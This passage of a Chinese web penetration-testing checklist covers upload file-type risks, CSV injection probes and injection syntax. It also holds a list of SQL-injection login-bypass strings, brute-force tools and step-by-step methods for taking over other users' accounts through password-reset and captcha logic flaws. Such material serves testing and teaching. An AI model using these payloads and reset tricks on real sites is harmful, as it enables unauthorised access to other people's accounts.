\u7279\u6b8a\u6587\u4ef6 \u2022 svg / html / htm / swf \u2022 xss \u2022 pdf \u2022 chrome \u91cc\u53ef\u4ee5\u8df3\u8f6c cer / asa / spx / php5 / phtml \u2022 \u53ef\u80fd\u4f1a\u88ab\u5f53\u505a\u52a8\u6001\u8bed\u8a00\u89e3\u6790 .htaccess / .user.ini / web.config / web.xml \u2022 \u4fee\u6539\u89e3\u6790\u89c4\u5219 .xls / .xlsx \u2022 POI Excel XXE .tar / .tar.gz / .zip \u2022 \u53ef\u80fd\u5b58\u5728\u6587\u4ef6\u91ca\u653e\u76ee\u5f55\u8df3\u8f6c\u95ee\u9898 .pkl \u2022 python\u53cd\u5e8f\u5217\u5316\u6587\u4ef6 .xml \u2022 \u53ef\u80fd\u6709 XXE .yaml / .yml \u2022 YAML \u53cd\u5e8f\u5217\u5316 .jar / .class \u2022 \u4e0a\u4f20\u5230 java classpath \u7684\u76ee\u5f55\u4e0b\uff0c\u7c7b\u88ab\u52a0\u8f7d\u65f6\u6267\u884c\u4ee3\u7801 \u65e0\u5927\u5c0f\u548c\u6b21\u6570\u9650\u5236 \u2022 \u65e0\u9650\u4e0a\u4f20\u5236\u9020\u5783\u573e\u6570\u636e\u5835\u6b7b\u786c\u76d8 \u6709\u56fe\u7247\u52a0\u5de5\u7684\u5730\u65b9\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0bimagemagick\u547d\u4ee4\u6267\u884c \u6587\u4ef6\u8bfb\u53d6 \u8bfb\u53d6\u7cfb\u7edf\u654f\u611f\u6587\u4ef6 \u6587\u4ef6\u5305\u542b \u53ef\u8bfb\u53d6\u6587\u4ef6\u6216\u4ee3\u7801\u6267\u884c \u6587\u4ef6\u5220\u9664 \u5220\u9664\u914d\u7f6e\u6587\u4ef6\u53ef\u7834\u574f\u7f51\u7ad9 \u5220\u9664\u5b89\u88c5\u9501\u53ef\u91cd\u88c5 \u6587\u4ef6\u89e3\u538b \u5982\u679c\u4e0a\u4f20\u6587\u4ef6\u4e3a tar / tar.gz \u7c7b\u578b\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u6784\u538b\u7f29\u5305\u5185\u6587\u4ef6\u540d\u4e3a../../../../xxx \u7684tar\u5305 \u6587\u4ef6\u5bfc\u51fa \u5982\u679c\u662fCSV \u6216\u8005 Excel\u53ef\u4ee5\u6ce8\u610f\u4e00\u4e0bCSV\u6ce8\u5165 =2222-1 -1+1=2222-1 @=2222-1 \\r\\n=2222-1 111,=2222-1, 2.4\u547d\u4ee4\u6267\u884c \u00b6 \u2022 \u547d\u4ee4\u6ce8\u5165 \u2022 --xxxx \u53c2\u6570\u6ce8\u5165 \u2022 | \u548c | | \u4e0e\u7b26\u53f7 \u2022 & \u548c && \u4e0e\u7b26\u53f7 \u2022 ; \u5206\u53f7 \u2022 ${} \u4ee3\u7801\u6267\u884c \u2022 \u8868\u8fbe\u5f0f \u2022 freemarker \u2022 OGNL \u2022 Spel \u2022 jsel \u2022 \u975e\u8868\u8fbe\u5f0f \u2022 php \u2022 eval \u2022 assert \u2022 call_user_func() / call_user_func_array() \u2022 preg_replace() \u2022 create_function() \u2022 array_map() \u2022 array_filter() \u2022 usort() / uasort() \u2022 \u53cd\u5e8f\u5217\u5316 \u2022 php \u6e90\u6587\u4ef6\u62fc\u63a5\u5199\u5165 \u2022 java \u2022 \u53cd\u5e8f\u5217\u5316 \u2022 \u8fdc\u7a0b jar \u52a0\u8f7d \u2022 \u53cd\u5c04\u673a\u5236 \u2022 jsp \u6e90\u6587\u4ef6\u62fc\u63a5\u5199\u5165 2.5\u5f31\u53e3\u4ee4\u53ca\u5b57\u5178\u7834\u89e3 \u00b6 \u540e\u53f0\u5f31\u53e3\u4ee4\u7206\u7834\u649e\u5e93\uff08\u5c1d\u8bd5\u4e07\u80fd\u5bc6\u7801\u3001\u7279\u5b9a\u8d44\u4ea7\u5e38\u7528\u5bc6\u7801\u3001\u5f31\u53e3\u4ee4\u540e\u518d\u649e\u5e93\uff09 asp aspx\u4e07\u80fd\u5bc6\u7801 1\uff1a \"or \"a\"=\"a 2\uff1a ')or('a'='a 3\uff1aor 1=1-- 4\uff1a'or 1=1-- 5\uff1aa'or' 1=1-- 6\uff1a \"or 1=1-- 7\uff1a'or'a'='a 8\uff1a \"or\"=\"a'='a 9\uff1a'or''=' 10\uff1a'or'='or' 11: 1 or '1'='1'=1 12: 1 or '1'='1' or 1=1 13: 'OR 1=1%00 14: \"or 1=1%00 15: 'xor 16: \u65b0\u578b\u4e07\u80fd\u767b\u9646\u5bc6\u7801 \u7528\u6237\u540d ' UNION Select 1,1,1 FROM admin Where ''=' \uff08\u66ff\u6362\u8868\u540dadmin\uff09 \u5bc6\u7801 1 Username=-1%cf' union select 1,1,1 as password,1,1,1 %23 Password=1 17..admin' or 'a'='a \u5bc6\u7801\u968f\u4fbf PHP\u4e07\u80fd\u5bc6\u7801 'or'='or' 'or 1=1/* \u5b57\u7b26\u578b GPC\u662f\u5426\u5f00\u90fd\u53ef\u4ee5\u4f7f\u7528 User: something Pass: ' OR '1'='1 jsp \u4e07\u80fd\u5bc6\u7801 1'or'1'='1 admin' OR 1=1/* \u7528\u6237\u540d\uff1aadmin \u7cfb\u7edf\u5b58\u5728\u8fd9\u4e2a\u7528\u6237\u7684\u65f6\u5019 \u624d\u7528\u5f97\u4e0a \u5bc6\u7801\uff1a1'or'1'='1 pydictor\u3001cupp\u3001crunch\u5b57\u5178\u751f\u6210\u5de5\u5177\u3001\u81ea\u5199\u5b57\u5178\u751f\u6210py\uff08\u5c0f\u9ed1\u7684\u4eba\u540d\u5b57\u5178py\uff09\uff1b dymerge\u5b57\u5178\u5408\u5e76\u53bb\u91cd\u5de5\u5177\u3001\u81ea\u5df1\u5199\u53bb\u91cdpy\uff1b hydra\u7206\u7834\u5de5\u5177 \u8d85\u7ea7\u5f31\u53e3\u4ee4\u68c0\u9a8c\u5de5\u5177 burpsuite \u7206\u7834 \u4f7f\u7528\u5f31\u7528\u6237\u540d\u5bf9\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u7834\u89e3 \u4f7f\u7528\u5f31\u53e3\u4ee4\u5bc6\u7801\u5bf9\u7528\u6237\u540d\u8fdb\u884c\u66b4\u529b\u7834\u89e3 2.6\u903b\u8f91\u6f0f\u6d1e \u00b6 Cookie \u00b6 \u4e00\u4e9b\u7f51\u7ad9\u4f1a\u5229\u7528 Cookie \u662f\u5426\u4e3a\u7a7a\u3001Session \u662f\u5426\u4e3a true \u6765\u5224\u65ad\u7528\u6237\u662f\u5426\u53ef\u4ee5\u767b\u5f55\uff0c\u53ea\u8981\u6784\u9020\u4e00\u4e2a Cookie \u6216 Session \u4e3a true \u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8ba4\u8bc1\u767b\u5f55 \u901a\u8fc7\u4fee\u6539 Cookie \u4e2d\u7684\u67d0\u4e2a\u53c2\u6570\u6765\u5b9e\u73b0\u767b\u5f55\u5176\u4ed6\u7528\u6237,\u8981\u6293\u5305\u5177\u4f53\u5206\u6790 \u6570\u636e\u7be1\u6539 \u6570\u91cf\u3001\u91d1\u989d\u3001ID\u3001\u90ae\u7bb1\u7b49\u6570\u636e\uff1a\u6700\u5927\u8d85\u8fc7\u9650\u5236\u3001\u8d1f\u6570\u30010\u3001\u5176\u4ed6\u7528\u6237\u6570\u636e\uff0c\u63d0\u4ea4\u540e\u67e5\u770b\u662f\u5426\u8fdb\u5165\u6b63\u5e38\u4e1a\u52a1\u6d41\u7a0b\uff0c\u662f\u5426\u5b58\u5728\u8d8a\u6743 \u4f8b\u5b50\uff1a \u4fee\u6539\u666e\u901a\u7528\u6237\u5bc6\u7801\uff0c\u6293\u5305 \u5c06 Referer \u548c POST \u4e2d\u7684\u666e\u901a\u7528\u6237\u6539\u6210 admin \u63d0\u4ea4\u6570\u636e\u540e\uff0c\u76f4\u63a5\u8fd4\u56de\u4e86 admin \u7684\u5bc6\u7801\u4fee\u6539\u9875\u9762\uff0c\u5229\u7528\u903b\u8f91\u6f0f\u6d1e\u83b7\u53d6\u8d85\u7ea7\u6743\u9650 \u6293\u5305\u4fee\u6539\u624b\u673a\u53f7\u53c2\u6570\u4e3a\u5176\u4ed6\u53f7\u7801\u8fdb\u884c\u5c1d\u8bd5\uff0c\u4f8b\u5982\u529e\u7406\u67e5\u8be2\u9875\u9762\uff0c\u8f93\u5165\u81ea\u5df1\u7684\u53f7\u7801\u7136\u540e\u6293\u5305\uff0c\u4fee\u6539\u624b\u673a\u53f7\u4e3a\u4ed6\u4eba\u53f7\u7801\uff0c\u67e5\u770b\u662f\u5426\u53ef\u4ee5\u67e5\u8be2\u4ed6\u4eba\u4e1a\u52a1 \u624b\u673a\u53f7 \u7be1\u6539 \u90ae\u7bb1\u6216\u8005\u7528\u6237 \u7be1\u6539 \u8ba2\u5355ID \u7be1\u6539 \u5546\u54c1\u7f16\u53f7 \u7be1\u6539 \u7528\u6237ID \u7be1\u6539 \u91d1\u989d \u7be1\u6539 \u5546\u54c1\u6570\u91cf \u7be1\u6539 \u9a8c\u8bc1\u7801\u7ed5\u8fc7 \u00b6 drop\u6389\u9875\u9762 \u8fd4\u56de\u5305\u91cc\u53ef\u80fd\u5c31\u6709\u9a8c\u8bc1\u7801 \u4e00\u6b21\u9a8c\u8bc1\u7801\u591a\u7528 \u9a8c\u8bc1\u7801\u8bc6\u522b\u63d2\u4ef6\uff0cburp \u6ce8\u518c\u754c\u9762\uff1a \u200b \u4efb\u610f\u7528\u6237\u6ce8\u518c \u200b \u53ef\u7206\u7834\u7528\u6237\u540d \u200b \u6ce8\u5165 \u200b XSS \u767b\u5f55\u754c\u9762 \uff1a \u200b \u7206\u7834\u7528\u6237\u540d\u3001\u5bc6\u7801 \u200b \u6ce8\u5165 \u200b \u4e07\u80fd\u5bc6\u7801 \u200b Xss Xss+Csrf \u200b \u4fee\u6539\u8fd4\u56de\u5305\u4fe1\u606f\uff0c\u767b\u5165\u4ed6\u4eba\u8d26\u6237 \u200b \u4fee\u6539cookie\u4e2d\u7684\u53c2\u6570\uff0c\u5982user,adminid\u7b49 \u5fd8\u8bb0\u5bc6\u7801\u754c\u9762 \uff1a \u4efb\u610f\u5bc6\u7801\u91cd\u7f6e\u6982\u8981\uff1a \u200b 1\uff0e\u91cd\u7f6e\u4e00\u4e2a\u8d26\u6237\uff0c\u4e0d\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u8bbe\u7f6e\u9a8c\u8bc1\u7801\u4e3a\u7a7a\u53d1\u9001\u8bf7\u6c42\u3002 \u200b 2\uff0e\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u67e5\u770b\u76f8\u5e94\u5305 \u200b 3\uff0e\u9a8c\u8bc1\u7801\u751f\u5b58\u671f\u7684\u7206\u7834 \u200b 4\uff0e\u4fee\u6539\u76f8\u5e94\u5305\u4e3a\u6210\u529f\u7684\u76f8\u5e94\u5305 \u200b 5\uff0e\u624b\u5de5\u76f4\u63a5\u8df3\u8f6c\u5230\u6821\u9a8c\u6210\u529f\u7684\u754c\u9762 \u200b 6\uff0e\u4e24\u4e2a\u8d26\u6237\uff0c\u91cd\u7f6e\u522b\u4eba\u5bc6\u7801\u65f6\uff0c\u66ff\u6362\u9a8c\u8bc1\u7801\u4e3a\u81ea\u5df1\u6b63\u786e\u7684\u9a8c\u8bc1\u7801 \u200b 7\uff0e\u91cd\u7f6e\u522b\u4eba\u5bc6\u7801\u65f6\uff0c\u66ff\u6362\u4e3a\u81ea\u5df1\u7684\u624b\u673a\u53f7 \u200b 8\uff0e\u91cd\u7f6e\u81ea\u5df1\u7684\u6210\u529f\u65f6\uff0c\u540c\u610f\u6d4f\u89c8\u5668\u91cd\u7f6e\u522b\u4eba\u7684\uff0c\u4e0d\u53d1\u9a8c\u8bc1\u7801 \u200b 9\uff0e\u66ff\u6362\u7528\u6237\u540d\uff0cID\uff0ccookie\uff0ctoken\u53c2\u6570\u7b49\u9a8c\u8bc1\u8eab\u4efd\u7684\u53c2\u6570 10\uff0e\u901a\u8fc7\u8d8a\u6743\u4fee\u6539\u4ed6\u4eba\u7684\u627e\u56de\u4fe1\u606f\u5982\u624b\u673a/\u90ae\u7bb1\u6765\u91cd\u7f6e \u7528\u6237\u51ed\u8bc1\u66b4\u529b\u7834\u89e3 \uff08\u9a8c\u8bc1\u7801\uff09 \u7ed5\u8fc7\u7684\u8bdd\uff0c\u8fd9\u91cc\u53ef\u4ee5\u8003\u8651\u4e00\u4e2a\u73b0\u72b6\uff1a \u4f8b\u5982\uff1a phone=18888888888abc \u56fd\u5185\u5f88\u591a\u60c5\u51b5\u4e0b\u90fd\u6ca1\u6709\u8fc7\u6ee4\u5b57\u7b26\u548c\u9650\u5236\u8f93\u51fa\u957f\u5ea6\uff0c\u9a8c\u8bc1\u5f88\u6709\u53ef\u80fd\u53ea\u662f\u7b80\u5355\u7684\u5904\u7406 \u53ea\u8981\u66f4\u6362\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\uff0c\u5c31\u53ef\u4ee5\u7ed5\u8fc7\u8bf7\u6c42\u8fc7\u4e8e\u9891\u7e41\u7684\u9650\u5236 \u4f46\u662f\u6821\u9a8c\u65f6\uff0c\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\u4f1a\u88ab\u8fc7\u6ee4\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u66b4\u529b\u7834\u89e3\u9a8c\u8bc1\u7801\uff08\u4e0d\u8ba1\u5165\u6b21\u6570\uff09 \u6240\u4ee5\u53ea\u8981\u5728\u66b4\u529b\u7834\u89e3\u7684\u540c\u65f6\uff0c\u6539\u53d8\u624b\u673a\u53f7\u540e\u9762\u7684\u5b57\u7b26\u5373\u53ef\u8fbe\u5230\u6f0f\u6d1e\u6548\u679c \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u4f46\u662f\u9a8c\u8bc1\u6b21\u6570\u88ab\u9650\u5236\uff0c\u6293\u5305 \u53ef\u4ee5\u5c1d\u8bd5\u5728\u624b\u673a\u53f7\u540e\u9762\u6dfb\u52a0\u4e0d\u4e3a\u6570\u5b57\u7684\u5b57\u7b26\uff0c\u67e5\u770b\u662f\u5426\u8fc7\u6ee4 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u4e2a\u9a8c\u8bc1\u7801\uff0c\u6293\u5305 \u66b4\u529b\u7834\u89e3\u9a8c\u8bc1\u7801\uff08\u5047\u5982\u53ea\u6709\u56db\u4f4d\uff09\uff0c\u5f88\u5feb\u5c31\u53ef\u4ee5\u7834\u89e3\u51fa\u6765 \u56db\u4f4d\u6216\u516d\u4f4d\u7eaf\u6570\u5b57\uff0c\u9a8c\u8bc1\u7801\u6b21\u6570\u672a\u9650\u5236 \u4f8b\u5982\uff1a \u5982\u679c\u9a8c\u8bc1\u7801\u6b21\u6570\u9650\u5236\uff0c\u7834\u89e3\u4e00\u4f1a\u5c31\u4f1a\u63d0\u793a\u8bf7\u6c42\u8fc7\u4e8e\u9891\u7e41\uff0c\u8fd9\u65f6\u5c31\u9700\u8981\u7ed5\u8fc7\u9650\u5236 \u4f8b\u5982\uff1a \u901a\u8fc7\u5bc6\u4fdd\u95ee\u9898\u627e\u56de\u5bc6\u7801\uff0c\u67e5\u770b\u6e90\u7801\uff0c\u5bc6\u4fdd\u95ee\u9898\u548c\u7b54\u6848\u5c31\u5728\u6e90\u7801\u4e2d\u663e\u793a \u8fd4\u56de\u51ed\u8bc1\uff08\u9a8c\u8bc1\u7801 \u53ca token\uff09\u3001\u90ae\u7bb1\u5f31 token\u3001\u7528\u6237\u51ed\u8bc1\u6709\u6548\u6027\u3001\u91cd\u65b0\u7ed1\u5b9a \u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u8fd4\u56de\u7684\u6570\u636e\u4e2d\u6709\u4e00\u4e2a\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\uff08token\uff09\uff0c\u5148\u8bb0\u5f55\u4e0b\u8fd9\u4e2a\u52a0\u5bc6\u5b57\u7b26\u4e32 \u7ee7\u7eed\u6309\u7167\u6b63\u5e38\u6d41\u7a0b\uff0c\u767b\u5f55\u90ae\u7bb1\u83b7\u5f97\u9a8c\u8bc1\u7801\uff0c\u8fd4\u56de\u586b\u5199\u9a8c\u8bc1\u7801\u540e\uff0c\u8fdb\u5165\u4e0b\u4e00\u4e2a\u586b\u5199\u65b0\u5bc6\u7801\u9875\u9762\uff0c\u53d1\u73b0 URL \u540e\u65b0\u589e\u4e86\u4e00\u4e2a\u52a0\u5bc6\u9a8c\u8bc1\u7684\u5b57\u7b26\u4e32 \u8fd9\u4e2a\u5b57\u7b26\u4e32\u5c31\u662f\u4e4b\u524d\u6570\u636e\u5305\u4e2d\u8bb0\u5f55\u7684\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u90ae\u7bb1\u9a8c\u8bc1\u7801\u8fd9\u4e2a\u73af\u8282\u53ef\u4ee5\u7ed5\u8fc7\uff0c\u76f4\u63a5\u7528\u4ed6\u4eba\u90ae\u7bb1\u6293\u5305\u83b7\u5f97\u52a0\u5bc6\u5b57\u7b26\u4e32\u5c31\u53ef\u4ee5\u91cd\u7f6e\u4ed6\u4eba\u5bc6\u7801 \u6839\u636e\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u9a8c\u8bc1\u7801\u76f4\u63a5\u663e\u793a verifycode=xxxx\uff0c\u6216\u8005\u7531 md5 \u52a0\u5bc6\u540e\u663e\u793a\uff0c\u89e3\u5bc6\u5373\u53ef\uff08\u540c\u7406\uff0c\u6709\u7684\u65f6\u5019\u8f93\u5165\u7528\u6237\u540d\uff0c\u6293\u5305\u53ef\u4ee5\u770b\u5230\u8fd4\u56de\u7684\u624b\u673a\u53f7\u7b49\u5176\u4ed6\u4fe1\u606f\uff09 \u6839\u636e\u90ae\u7bb1\u627e\u56de\u5bc6\u7801,\u6293\u5305\u76f4\u63a5\u8fd4\u56de,\u5bc6\u7801\u627e\u56de\u51ed\u8bc1\u53ef\u80fd\u5728\u9875\u9762\u4e2d \u4f8b\u5982\uff1a \u5229\u7528\u4e24\u4e2a\u5e10\u53f7\u540c\u65f6\u70b9\u51fb\u627e\u56de\u5bc6\u7801\uff0c\u53bb\u90ae\u7bb1\u67e5\u770b\u627e\u56de\u5bc6\u7801\u7684\u94fe\u63a5\uff0c\u53d1\u73b0\u4e24\u8005\u7684\u968f\u673a token \u53ea\u5dee 1-2\uff0c\u800c\u4e14\u53ef\u4ee5\u731c\u6d4b\u51fa\u4e3a\u670d\u52a1\u5668\u65f6\u95f4 \u6240\u4ee5\u53ef\u4ee5\u7528\u4e00\u4e2a\u672a\u77e5\u5e10\u53f7\u548c\u4e00\u4e2a\u5df2\u77e5\u5e10\u53f7\u540c\u65f6\u70b9\u51fb\u627e\u56de\u5bc6\u7801\uff0c\u7a0d\u5fae\u904d\u5386\u4e00\u4e0b\u968f\u673a token\uff0c\u5c31\u53ef\u4ee5\u6784\u9020\u51fa\u672a\u77e5\u5e10\u53f7\u7684\u5bc6\u7801\u627e\u56de\u94fe\u63a5 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6b63\u5e38\u6d41\u7a0b\u53bb\u90ae\u7bb1\u67e5\u770b\u91cd\u7f6e\u5bc6\u7801\u94fe\u63a5\uff0c\u53d1\u73b0\u94fe\u63a5\u5904\u6709\u4e00\u4e32 md5 \u52a0\u5bc6\u5b57\u7b26\u4e32 \u5b57\u7b26\u4e32\u89e3\u5bc6\uff0c\u7c7b\u4f3c 1491293277\uff0810\u4f4d\uff09\uff0c\u53ef\u4ee5\u5224\u65ad\u4e3a Unix\u65f6\u95f4\u6233\uff0c\uff08\u53ef\u80fdmd5\uff09 \u91cd\u7f6e\u4ed6\u4eba\u5bc6\u7801\u53ea\u9700\u8981\u5229\u7528\u4ed6\u4eba\u90ae\u7bb1\u53d1\u9001\u91cd\u7f6e\u5bc6\u7801\u90ae\u7bb1\uff0c\u5728\u77ed\u65f6\u95f4\u5185\u5bf9 Unix\u65f6\u95f4\u6233 \u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u5373\u53ef\u83b7\u5f97\u91cd\u7f6e\u5bc6\u7801\u7684\u94fe\u63a5 \u91cd\u7f6e\u5bc6\u7801\u94fe\u63a5\u76f4\u63a5\u4f7f\u7528\u7528\u6237\u540d\u6765\u533a\u522b\uff0c\u6539\u53d8\u7528\u6237\u540d\u5373\u53ef\u66f4\u6539\u4ed6\u4eba\u5bc6\u7801 \u7ed5\u8fc7**token** \u6b63\u5e38\u6d41\u7a0b\u4e0b\uff0c\u5bf9\u6bcf\u4e2a\u529f\u80fd\u6a21\u5757\u8fdb\u884c\u6293\u5305\uff0c\u5206\u522b\u662f\u53d1\u9001\u9a8c\u8bc1\u7801\uff0c\u9a8c\u8bc1\u9a8c\u8bc1\u7801\u662f\u5426\u6b63\u786e\uff0c\u83b7\u53d6 token\uff0c\u91cd\u7f6e\u5bc6\u7801 \u63a5\u4e0b\u6765\uff0c\u7528\u4ed6\u4eba\u5e10\u53f7\u901a\u8fc7\u90ae\u7bb1\u9a8c\u8bc1\uff0c\u6293\u5305\uff0c\u5c06\u5176\u4e2d Cookie \u5185\u4ece JSESSIONID \u5f00\u59cb\u7684\u5185\u5bb9\u66ff\u6362\u81f3\u6b63\u5e38\u6d41\u7a0b\u7684\u53d1\u751f\u9a8c\u8bc1\u7801\u5305\u5185\uff0c\u540c\u65f6\u66ff\u6362\u81ea\u5df1\u63a5\u53d7\u9a8c\u8bc1\u7801\u7684\u90ae\u7bb1\uff0c\u63d0\u4ea4 \u901a\u8fc7\u90ae\u7bb1\u83b7\u53d6\u9a8c\u8bc1\u7801\u540e\uff0c\u5c06\u9a8c\u8bc1\u7801\u3001Cookie\u3001\u4ed6\u4eba\u5e10\u53f7\u3001\u81ea\u5df1\u90ae\u7bb1\u66ff\u6362\u81f3\u9a8c\u8bc1\u9a8c\u8bc1\u7801\u6a21\u5757\uff0c\u63d0\u4ea4\uff08\u4e0d\u7528\u5728\u610f\u8fd4\u56de\u662f\u5426\u9519\u8bef\uff09 \u7ee7\u7eed\u66ff\u6362\u5185\u81f3\u83b7\u53d6 token \u6a21\u5757\uff0c\u63d0\u4ea4\u83b7\u53d6 token \u6700\u540e\u5c06\u83b7\u53d6\u7684 token \u548c\u4e0a\u9762\u7684\u5185\u5bb9\u66ff\u6362\u81f3\u6700\u540e\u7684\u91cd\u7f6e\u5bc6\u7801\u6a21\u5757\uff0c\u63d0\u4ea4\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u8bbf\u95ee\u94fe\u63a5\u91cd\u7f6e\u5bc6\u7801\uff0c\u8f93\u5165\u65b0\u5bc6\u7801\u540e\u63d0\u4ea4\u65f6\u6293\u5305\uff0c\u867d\u7136\u6709 token\uff0c\u4f46\u662f\u4f9d\u7136\u53ef\u4ee5\u76f4\u63a5\u4fee\u6539 \u7528\u6237ID \u8fdb\u800c\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u4f8b\u5982\uff1a \u901a\u8fc7\u4ed6\u4eba\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u5c06\u4ed6\u4eba\u624b\u673a\u53f7\u66ff\u6362\u6210\u81ea\u5df1\u7684\u624b\u673a\u53f7\uff0c\u83b7\u53d6\u9a8c\u8bc1\u7801\uff0c\u63d0\u4ea4\u540e\u4fee\u6539\u5bc6\u7801 \u901a\u8fc7\u81ea\u5df1\u624b\u673a\u53f7\u627e\u56de\u5bc6\u7801\uff0c\u83b7\u53d6\u9a8c\u8bc1\u7801\u540e\u6293\u5305\uff0c\u5c06\u6570\u636e\u5305\u4e2d\u7684 username \u6539\u4e3a\u4ed6\u4eba\u7528\u6237\u540d\uff0c\u63d0\u4ea4\u540e\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u77ed\u4fe1\u9a8c\u8bc1\u7801\u3001\u90ae\u7bb1 token\u3001\u91cd\u7f6e\u5bc6\u7801 token \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0cURL \u94fe\u63a5\u4e2d\u4fee\u6539 \u7528\u6237ID \u4e3a\u4ed6\u4eba\uff0c\u90ae\u7bb1\u4e0d\u53d8\uff0c\u4e4b\u540e\u901a\u8fc7\u94fe\u63a5\u53ef\u4ee5\u5c06\u4ed6\u4eba\u8d26\u6237\u7ed1\u5b9a\u4e3a\u81ea\u5df1\u7684\u90ae\u7bb1\uff0c\u4e4b\u540e\u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801 \u4f8b\u5982\uff1a \u7ed9\u5df2\u77e5\u8d26\u6237\u7ed1\u5b9a\u624b\u673a\uff0c\u53d1\u73b0\u7ed1\u5b9a\u624b\u673a\u7684 URL \u94fe\u63a5\u4e2d\u6709 uid \u53c2\u6570\uff0c\u4fee\u6539 uid \u53c2\u6570\u4e3a\u4ed6\u4eba\u7684\uff0c\u5373\u53ef\u5b9e\u73b0\u5c06\u4ed6\u4eba\u7684\u8d26\u6237\u7ed1\u5b9a\u4e0a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u4e4b\u540e\u901a\u8fc7\u624b\u673a\u6765\u4fee\u6539\u5bc6\u7801 \u4fee\u6539\u4e2a\u4eba\u8d44\u6599\u5904\u6293\u5305\uff0c\u4fee\u6539 userId \u4e3a\u4ed6\u4eba\uff0c\u4fee\u6539 mobilePhone \u4e3a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u5373\u53ef\u5b9e\u73b0\u5c06\u4ed6\u4eba\u7684\u8d26\u6237\u7ed1\u5b9a\u4e0a\u81ea\u5df1\u7684\u624b\u673a\uff0c\u4e4b\u540e\u901a\u8fc7\u624b\u673a\u6765\u4fee\u6539\u5bc6\u7801 \u624b\u673a\u7ed1\u5b9a\u3001\u90ae\u7bb1\u7ed1\u5b9a \u4f8b\u5982\uff1a \u901a\u8fc7\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u627e\u56de\u5bc6\u7801\uff0c\u6293\u5305\uff0c\u5c06\u5bc6\u7801\u4fdd\u62a4\u95ee\u9898\u5220\u9664\uff0c\u76f4\u63a5\u4fee\u6539\u5bc6\u7801\uff0c\u63d0\u4ea4 \u6ce8\uff1a\u6b64\u5904\u5bc6\u4fdd\u95ee\u9898\u548c\u65b0\u5bc6\u7801\u5728\u540c\u4e00\u9875\u9762 \u4f8b\u5982\uff1a \u6b63\u5e38\u6d41\u7a0b\uff0c\u901a\u8fc7\u624b\u673a\u53f7\u63d0\u4ea4\u9a8c\u8bc1\u7801\u627e\u56de\u5bc6\u7801\u5904\u6293\u5305\uff0c\u8bb0\u5f55\u4e0b\u8fd9\u4e2a\u5305\u7684\u5185\u5bb9 \u901a\u8fc7\u5df2\u77e5\u7528\u6237\u540d\u627e\u56de\u5bc6\u7801\uff0c\u67e5\u770b\u6e90\u4ee3\u7801\u53ef\u4ee5\u53d1\u73b0\u7528\u6237\u5176\u4ed6\u4fe1\u606f\uff08\u6bd4\u5982\uff1a\u624b\u673a\u53f7\u3001\u90ae\u7bb1\uff09 \u901a\u8fc7\u53d1\u73b0\u7684\u624b\u673a\u53f7\u9009\u62e9\u901a\u8fc7\u624b\u673a\u627e\u56de\u5bc6\u7801\uff0c\u968f\u4fbf\u8f93\u5165\u77ed\u4fe1\u9a8c\u8bc1\u7801\uff0c\u6293\u5305 \u4fee\u6539\u4e4b\u524d\u8bb0\u5f55\u4e0b\u7684\u5305\u7684\u5185\u5bb9\uff0c\u5c06\u5176\u4e2d Session id\u3001\u7528\u6237ID \u4fee\u6539\u4e3a\u521a\u521a\u4ece\u5176\u4ed6\u7528\u6237\u540d\u6293\u5305\u83b7\u5f97\u7684\u5185\u5bb9\uff0c\u63d0\u4ea4\u8fd9\u4e2a\u5305\uff0c\u5373\u53ef\u6210\u529f\u4fee\u6539\u4ed6\u4eba\u5bc6\u7801 \u6700\u7ec8\u63d0\u4ea4\u6b65\u9aa4 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u6700\u540e\u901a\u8fc7\u94fe\u63a5\u81f3\u4fee\u6539\u5bc6\u7801\u9875\u9762\uff0c\u4fee\u6539\u5bc6\u7801\u540e\u63d0\u4ea4\uff0c\u6293\u5305\uff0c\u83b7\u5f97 Uid \u53c2\u6570\uff0c\u4fee\u6539\u4e3a\u4ed6\u4eba\uff0c\u5373\u53ef\u4fee\u6539\u5176\u4ed6\u7528\u6237\u5bc6\u7801 \u670d\u52a1\u5668\u9a8c\u8bc1\u7684\u9a8c\u8bc1\u903b\u8f91\u4e3a\u7a7a\uff08\u7ed5\u8fc7\u8ba4\u8bc1\uff09 \u4f8b\u5982\uff1a \u901a\u8fc7\u90ae\u7bb1\u627e\u56de\u5bc6\u7801\uff0c\u70b9\u51fb\u8bf7\u91cd\u65b0\u53d1\u9001\u90ae\u4ef6\u5904\u6293\u5305\uff0c\u5c06\u90ae\u7bb1\u6539\u4e3a\u81ea\u5df1\u7684\u90ae\u7bb1\uff0c\u901a\u8fc7\u94fe\u63a5\u6210\u529f\u4fee\u6539\u5bc6\u7801 \u4f8b\u5982\uff1a 